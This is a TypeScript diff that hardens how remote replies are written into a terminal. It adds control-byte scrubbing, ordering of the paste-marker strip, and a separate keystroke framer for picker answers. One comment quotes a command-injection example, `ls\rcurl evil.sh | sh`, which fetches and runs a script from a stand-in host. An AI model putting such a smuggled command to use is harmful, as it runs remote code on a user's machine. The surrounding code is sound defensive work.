@@ -96,9 +96,15 @@ function stripTerminator(value: string): string {
  * read as keystrokes (see the header).
  */
 function framePaste(body: string): FramedPtyText {
-  // The ONE place the brand is minted, and it sits directly on top of the strip — so a value can
-  // only acquire the type by actually having been stripped and wrapped.
-  return `${PASTE_START}${stripPasteMarkers(body)}${PASTE_END}` as FramedPtyText;
+  // The ONE place the brand is minted, and it sits directly on top of BOTH filters — so a value can
+  // only acquire the type by actually having been cleaned and wrapped.
+  //
+  // ORDER IS LOAD-BEARING: strip markers, THEN scrub control bytes. Reversed, `scrubControls`
+  // removes the ESC out of `ESC[200~` and leaves the literal text `[200~`, which
+  // `stripPasteMarkers` can no longer match — so the marker is defanged (it is no longer an escape
+  // sequence) but its debris is pasted into the user's prompt as visible garbage. Caught by the
+  // existing "strips an embedded PASTE_START" test when this was first written the other way round.
+  return `${PASTE_START}${scrubControls(stripPasteMarkers(body))}${PASTE_END}` as FramedPtyText;
 }
 
 /**
@@ -116,6 +122,61 @@ function framePaste(body: string): FramedPtyText {
  */
 export function frameRelaySubmit(value: string): FramedPtyText {
   return `${framePaste(stripTerminator(value))}\r` as FramedPtyText;
+}
+
+/**
+ * Remove C0 control bytes that a terminal would act on, keeping TAB and LF.
+ *
+ * THE PASTE WRAPPER IS NOT A FILTER, which is the distinction this function exists to draw. Wrapping
+ * a body in `ESC[200~ … ESC[201~` only neutralizes its contents if the FOREGROUND PROGRAM has
+ * bracketed-paste mode enabled. A raw shell — the state a PTY is in before `claude` execs, and after
+ * it exits — has it off, and then the markers arrive as literal `[200~` text while an interior `\r`
+ * executes as a second command line. So `ls\rcurl evil.sh | sh` was still an injection against the
+ * exact payload this gate is meant to sanitize. Same shape for `\x03` (SIGINT) and `\x04` (EOF).
+ *
+ * Hence: scrub first, frame second. The framing is defense in depth; this is the primary filter.
+ *
+ * LF is DELIBERATELY KEPT for paste-framed free text, so a multi-line prompt typed on a phone still
+ * arrives as multiple lines. That is a real, bounded residual — with bracketed paste off, an
+ * interior LF still submits a line. It is accepted rather than closed because closing it removes a
+ * feature people use, and because the remaining exposure is a bare shell rather than a live CLI.
+ * The keystroke path below has no such need and keeps nothing.
+ */
+function scrubControls(s: string): string {
+// \u0000-\u0008 (NUL..BS) and \u000B-\u001F (VT..US, which includes CR \r and ESC),
+  // plus \u007F (DEL). TAB (\u0009) and LF (\u000A) are the deliberate survivors.
+  //
+  // Written as ESCAPES, never as literal control bytes: a source file carrying raw NUL/ESC is
+  // one careless editor or copy-paste away from being silently altered, and the diff would not
+  // show it. This is a security filter, so its own text has to be robust.
+  // eslint-disable-next-line no-control-regex -- removing control bytes is this function's job
+  return s.replace(/[\u0000-\u0008\u000B-\u001F\u007F]/g, "");
+}
+
+/**
+ * The wire form of a remote PICKER ANSWER: strip, scrub every control byte, exactly one CR — and
+ * NO bracketed-paste wrapper.
+ *
+ * WHY A SECOND FRAMER RATHER THAN REUSING {@link frameRelaySubmit} (roborev 60573, High). These
+ * payloads are keystrokes, not text: `"y\n"`, `"n\n"`, `"2\n"` answering a live raw-mode Ink dialog,
+ * produced by `suggestions/heuristics.ts` and `attentionReplies.ts`. Wrapping a one-key answer in a
+ * bracketed paste is a thing this codebase forbids in several places at once —
+ * `conciergeDispatch.ts`'s header rules, `frameCloudSubmit`'s caller refusing while a picker is
+ * live, `dictationTerminalRoute.WRITE_BLOCKING_PROMPTS` — and {@link frameSubmit}'s own doc says
+ * wrapping a click "would change what the desktop has always sent".
+ *
+ * The concrete failure it caused: a phone tap on "Approve" sent `ESC[200~y ESC[201~\r` while the
+ * same button clicked locally sent `y\r`. Against a permission dialog whose select component does
+ * not consume paste markers, the leading ESC reads as Escape and CANCELS the prompt, `[200~y` lands
+ * as stray keystrokes in whatever renders next, and the CR confirms it. An approval that silently
+ * does nothing is the good case.
+ *
+ * Scrubs ALL controls including LF: a picker answer never legitimately contains an interior
+ * newline, so there is nothing to trade off here — unlike the paste path above.
+ */
+export function frameRelayKeystroke(value: string): FramedPtyText {
+  const body = scrubControls(stripPasteMarkers(stripTerminator(value))).replace(/\n/g, "");
+  return `${body}\r` as FramedPtyText;
 }
 
 /**
@@ -141,8 +202,28 @@ export function authorizeDecision(
   // (paste, no CR: the text sits in the prompt for the human to send); the submit branch mirrors
   // `pty.deliverSubmit`. Framing the no-submit branch matters just as much: without it an embedded
   // `ESC[200~` left the NEXT chained operation's paste state corrupted.
-  const text =
-    d.submit || d.reply.endsWith("\n") ? frameRelaySubmit(d.reply) : framePaste(d.reply);
+  //
+  // A SUBMIT IS FRAMED BY SHAPE, NOT BY GUESS (roborev 60573, High). Most decision replies are
+  // picker ANSWERS — `suggestedRepliesFor` hands the phone `"y\n"`, `"n\n"`, or a detected menu
+  // option — and wrapping a one-key answer in a bracketed paste is what broke: the phone sent
+  // `ESC[200~y ESC[201~\r` where a local click sends `y\r`, and against a dialog that does not
+  // consume paste markers the leading ESC cancels the prompt. But the same field can also carry a
+  // typed multi-line reply, which genuinely wants a paste.
+  //
+  // The discriminator is the payload itself rather than a flag we would have to trust: a picker
+  // answer never contains an INTERIOR newline. Single-line ⇒ keystroke framing, byte-identical to
+  // the desktop click. Multi-line ⇒ paste framing, because it is real text.
+  // Interior CR is dropped before the test, so only LF counts as evidence of genuine multi-line
+  // text. Otherwise the DISCRIMINATOR ITSELF is attacker-controlled: appending a `\r` to a one-key
+  // answer would flip a picker reply onto the paste path and re-create the cancelled-dialog bug on
+  // demand. A CR is never legitimate inside a reply, so removing it here loses nothing.
+  const body = stripTerminator(d.reply).replace(/\r/g, "");
+  const multiline = body.includes("\n");
+  const text = d.submit || d.reply.endsWith("\n")
+    ? multiline
+      ? frameRelaySubmit(d.reply)
+      : frameRelayKeystroke(d.reply)
+    : framePaste(d.reply);
   return { agentId, text };
 }
 
